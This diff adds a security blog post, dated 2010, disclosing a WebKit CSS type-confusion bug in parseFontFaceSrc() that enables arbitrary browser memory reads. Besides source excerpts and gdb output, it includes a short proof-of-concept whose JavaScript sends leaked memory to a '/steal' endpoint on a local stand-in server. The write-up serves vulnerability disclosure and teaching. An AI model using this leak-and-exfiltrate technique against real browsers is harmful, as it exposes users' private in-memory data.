@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js"></script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <title>Root Cause</title>
+    <link rel="stylesheet" href="stylesheets/styles.css">
+    <link rel="stylesheet" href="stylesheets/github-light.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+        <h1><a href='http://struct.github.io'>Root Cause</a></h1>
+        <p></p>
+        <p class="view">
+        <a href="https://twitter.com/chrisrohlf">Twitter</a><br>
+        <a href="https://github.com/struct">GitHub</a><br>
+        <a href="https://www.linkedin.com/in/chrisrohlf">LinkedIn</a><br>
+        <a href="https://keybase.io/chrisrohlf">Keybase</a><br>
+        <a href="https://github.com/struct/research">Research</a><br>
+        <a href="resume.html">About</a><br>
+        <a href="mailto:chris.rohlf@gmail.com">Email</a>
+        </p>
+      </header>
+      <section>
+        <h2><div id='post0'>WebKit CSS Type Confusion</div></h2>
+        <p>        <script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js"></script>
+
+            <i>Originally published December 2010</i><br><br>
+This is an interesting WebKit vulnerability I came across and reported to Google, Apple and the WebKit.org developers. 
+<br><br>
+Software Affected: Chrome 7/8, Safari 5.0.3, Epiphany 2.30.2, WebKit-r72146 (others untested)
+<br><br>
+The severity of the vulnerability was marked Medium by the Chrome developers because the bug can only result in an information leak. I don't have a problem with that but I have some more thoughts on it at the end of the post. But first the technical details.
+<br><br>
+The WebKit CSS parser internally stores a CSSParserValueList which contains a vector of CSSParserValue structures. These structures are used to hold the contents of parsed CSS attribute values such as integers, floating point numbers or strings.
+<br><br>
+<pre class="prettyprint" lang-html="cpp" style="border: 0;">
+struct CSSParserValue {
+    int id;
+    bool isInt;
+    union {
+        double fValue;
+        int iValue;
+        CSSParserString string;
+        CSSParserFunction* function;
+    };
+    enum {
+        Operator = 0x100000,
+        Function = 0x100001,
+        Q_EMS    = 0x100002
+    };
+    int unit;
+
+    PassRefPtr createCSSValue();
+};</pre>
+<br>
+When WebKit has successfully parsed a CSS value it will set the unit variable to a constant indicating what type it should be interpreted as. So depending on the value of unit a different member of the union will be used to address the CSS value later in the code. If the value was a floating point or an integer the fValue or iValue will store that number. If the value is a string a special CSSParserString structure is used to copy the string before placing it into the DOM as element.style.src.
+<br><br>
+The vulnerability exists in a function responsible for parsing the location of a font face source. So we find ourselves in WebCore::CSSParser::parseFontFaceSrc() found in CSSParser.cpp of the WebKit source. I have clipped certain parts of the function for brevity.
+<br><br>
+<pre class="prettyprint" lang-html="cpp" style="border: 0;">
+bool CSSParser::parseFontFaceSrc()
+{
+    ...
+[3629]        } else if (val->unit == CSSParserValue::Function) {
+[3630]            // There are two allowed functions: local() and format().
+[3631]           CSSParserValueList* args = val->function->args.get();
+[3632]            if (args && args->size() == 1) {
+[3633]                if (equalIgnoringCase(val->function->name, "local(") && !expectComma) {
+[3634]                    expectComma = true;
+[3635]                    allowFormat = false;
+[3636]                    CSSParserValue* a = args->current();
+[3637]                    uriValue.clear();
+[3638]                    parsedValue = CSSFontFaceSrcValue::createLocal(a->string);
+</pre><br>
+At this point in the code the CSS parser has already extracted the value of the font face source and now the code is trying to determine whether the font value is local or not. If the source of the font is wrapped in a local() URL then we hit the code above. The problem here is that the CSSParserValue's unit variable is never checked on line 3633. The code assumes the value previously parsed is a string and the CSSParserString structure within the union has already been initialized by a previous caller. Now on line 3636 a CSSParserValue pointer, a, is assigned to the value and on line 3638 the a->string operator is called on it. Here is what that structure looks like:
+<br><br>
+<pre class="prettyprint" lang-html="cpp" style="border: 0;">
+struct CSSParserString {
+    UChar* characters;
+    int length;
+
+    void lower();
+
+    operator String() const { return String(characters, length); }
+    operator AtomicString() const { return AtomicString(characters, length); }
+};</pre>
+<br>
+So when a->string is called in line 3638 WebKit's internal string functions will be called to create a string with a source pointer of a->string.characters with a length of a->string.length so it can be added to the DOM by CSSParser::addProperty(). This code assumes the value is a string but this CSSParserValue may not have been initialized as one. Lets take a second look at the union again in the CSSParserValue structure:
+<br><br>
+<pre class="prettyprint" lang-html="cpp" style="border: 0;">
+    union {
+        double fValue;               // 64 bits
+        int iValue;                  // 32 bits
+        CSSParserString string;      // sizeof(CSSParserString)
+        CSSParserFunction* function; // 32 bits
+    };
+</pre>
+    <br>
+The double fValue will occupy 64 bits in memory on a 32 bit x86 platform [1]. This means in memory at runtime the first dword of fValue overlaps with string.characters and the second with string.length. If we can supply a specific floating point value as the source location of this font face we can trigger an information leak when WebKit interprets it as a CSSParserString structure and attempts to make a copy of the string. I should also note that the string creation uses StringImpl::create which copies the string using memcpy, so we don't have to worry about our stolen data containing NULL's. Exploiting this bug is very easy:
+<br>
+<pre>
+        function read_memory() {
+            ele = document.getElementById('1');
+            document.location = "http://localhost:4567/steal?s=" + encodeURI(ele.style.src);
+        }
+      ...
+      < h1 id=1 style="src: local(0.12323223423423.....);" />
+</pre>
+<br>
+That floating point number will occupy the first 64 bits of the union. The double fValue when holding this value will look like this in memory 0xbf95d38b 0x000001d5. Which means (a->string.characters = 0xbf95d38b) and (a->string.length = 0x000001d5). Through our floating point number we can control the exact address and length of an arbitrary read whose contents will then be added to the DOM as the source of the font face. In short, an attacker can steal as much content as he wants from anywhere in your browsers virtual memory. Here is the CSSParserValue structure in memory just after the assignment of the CSSParserValue pointer, a, when running the exploit.
+<br><br>
+<pre>
+(gdb) print *a
+$167 = {id = 0, isInt = false, {fValue = 9.9680408499984197e-312, iValue = -1080700021, 
+string = {characters = 0xbf95d38b, length = 469}, function = 0xbf95d38b}, unit = 1}
+
+(gdb) x/8x a
+0xb26734f0:    0x00000000    0x00000100    0xbf95d38b    0x000001d5
+0xb2673500:    0x00000001    0x00000000    0x00000000    0x00000000
+</pre>
+<br>
+Here is where the stack is mapped in my browser:
+<br><br>
+<pre>
+bf93a000-bf96e000 rw-p 00000000 00:00 0          [stack]
+</pre>
+<br>
+Memory disclosure vulnerabilities are becoming more valuable as memory corruption mitigations such as ASLR (Address Space Layout Randomization) become more adopted by software vendors. An info leak essentially makes ASLR worthless because an attacker can use it to find out where your browsers heap is mapped or where a specific DLL with ROP gadgets resides in memory. Normally an info leak might come in the form of exposing a single address from an object or reading a few bytes off the end of an object, which exposes vftable addresses. These types of leaks also make exploitation easier but usually don't expose any of the web content displayed by the browser. In the case of this bug we have to specify what address to read from. If an unmapped address is used or the read walks off the end of a page then we risk crashing the process. The attacker doesn't have to worry about this on platforms without ASLR.
+<br><br>
+But almost as important as reliable code execution, the more sensitive content we push into web browsers the more valuable a highly reliable and controllable info leak could become. You could theoretically use it to read an open document or webmail or any other sensitive content the users browser has open at the time or has cached in memory from a previous site.</p>
+      </section>
+      <footer>
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="javascripts/scale.fix.js"></script>
+              <script type="text/javascript">
+            var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+            document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+          </script>
+          <script type="text/javascript">
+            try {
+              var pageTracker = _gat._getTracker("UA-65842316-1");
+            pageTracker._trackPageview();
+            } catch(err) {}
+          </script>
+  </body>
+</html>
